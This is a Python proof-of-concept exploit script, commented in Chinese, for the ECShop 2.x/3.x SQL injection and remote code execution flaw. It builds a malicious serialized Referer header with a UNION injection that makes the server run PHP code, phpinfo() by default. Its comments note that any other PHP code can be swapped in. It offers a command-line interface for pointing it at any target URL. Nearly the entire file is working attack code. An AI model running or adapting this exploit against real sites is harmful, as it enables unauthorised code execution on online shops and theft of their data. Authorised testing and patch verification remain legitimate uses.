#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
ECShop 2.x/3.x SQL 注入/任意代码执行漏洞 POC
影响版本：ECShop 2.x（2017年及以前）、3.6.0 次新版
通过构造恶意 Referer 头，利用 SQL 注入写入恶意代码，最终实现任意代码执行。
"""

import requests
import sys
import argparse
import urllib3
import binascii

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def generate_poc(version='2.x'):
    """
    生成 ECShop 漏洞利用的 POC 字符串
    :param version: '2.x' 或 '3.x'
    :return: POC 字符串
    """
    # 恶意代码：phpinfo(); 可替换为其他 PHP 代码
    # 注意：需要保持格式与原始 POC 一致
    shell_code = "{$asd'];phpinfo();//}xxx"
    shell_hex = binascii.hexlify(shell_code.encode()).decode()

    id_part = "-1' UNION/*"
    id_hex = binascii.hexlify(id_part.encode()).decode()

    # 构造序列化数组
    arr = {
        "num": f"*/SELECT 1,0x{id_hex},2,4,5,6,7,8,0x{shell_hex},10-- -",
        "id": id_part
    }

    # 手动序列化（简化版，仅用于生成 POC）
    # 注意：实际 PHP 序列化格式为 a:2:{...}
    serialized = f'a:2:{{s:3:"num";s:{len(arr["num"])}:"{arr["num"]}";s:2:"id";s:{len(arr["id"])}:"{arr["id"]}";}}'

    # 根据版本选择哈希
    if version == '3.x':
        hash_val = '45ea207d7a2b68c49582d2d22adf953a'
    else:
        hash_val = '554fcae493e564ee0dc75bdf2ebf94ca'

    poc = f"{hash_val}ads|{serialized}{hash_val}"
    return poc


def exploit(target_url, version='2.x', timeout=10, verify=True):
    """
    执行漏洞利用
    :param target_url: 目标 URL，如 http://127.0.0.1:8080/user.php?act=login
    :param version: '2.x' 或 '3.x'
    :param timeout: 请求超时
    :param verify: 是否验证 SSL 证书
    :return: 是否成功
    """
    poc = generate_poc(version)
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
        "Referer": poc,
        "Connection": "close",
        "Upgrade-Insecure-Requests": "1",
        "Cache-Control": "max-age=0"
    }

    try:
        print(f"[*] 目标: {target_url}")
        print(f"[*] 版本: {version}")
        print(f"[*] Referer: {poc[:100]}...")

        resp = requests.get(target_url, headers=headers, timeout=timeout, verify=verify)

        # 检查响应中是否包含 phpinfo() 的输出特征
        if resp.status_code == 200:
            if "PHP Version" in resp.text or "phpinfo" in resp.text.lower():
                print("[+] 漏洞利用成功，phpinfo() 已执行！")
                # 提取部分 phpinfo 输出作为证据
                start = resp.text.find("PHP Version")
                if start != -1:
                    end = start + 200
                    print("\n[+] 响应片段:")
                    print("=" * 50)
                    print(resp.text[start:end] + "...")
                    print("=" * 50)
                return True
            else:
                print("[-] 响应中未发现 phpinfo() 输出，可能利用失败或目标已修补")
                # 打印前500字符便于调试
                print(f"    响应前500字符: {resp.text[:500]}")
                return False
        else:
            print(f"[-] 请求失败，状态码: {resp.status_code}")
            return False

    except requests.exceptions.ConnectionError:
        print(f"[-] 无法连接到 {target_url}，请检查地址是否正确")
    except requests.exceptions.Timeout:
        print(f"[-] 请求超时")
    except Exception as e:
        print(f"[-] 请求异常: {e}")
    return False


def main():
    parser = argparse.ArgumentParser(
        description="ECShop 2.x/3.x SQL 注入/任意代码执行漏洞 POC",
        epilog="示例: python3 poc.py http://127.0.0.1:8080/user.php?act=login --version 2.x"
    )
    parser.add_argument("url", help="目标 URL，如 http://127.0.0.1:8080/user.php?act=login")
    parser.add_argument("--version", "-v", default="2.x", choices=['2.x', '3.x'],
                        help="ECShop 版本: 2.x 或 3.x，默认 2.x")
    parser.add_argument("--timeout", type=int, default=10, help="请求超时秒数")
    parser.add_argument("--insecure", action="store_true", help="忽略 SSL 证书验证")
    args = parser.parse_args()

    verify = not args.insecure

    success = exploit(args.url, args.version, args.timeout, verify)

    if not success:
        print("\n[!] 漏洞利用失败，可能原因：")
        print("  1. 目标版本已修补（如 ECShop 3.6.0 最新版）")
        print("  2. 目标地址不正确")
        print("  3. 目标未安装或无法访问")
        sys.exit(1)
    else:
        print("\n[+] 漏洞利用成功！")
        sys.exit(0)


if __name__ == "__main__":
    main()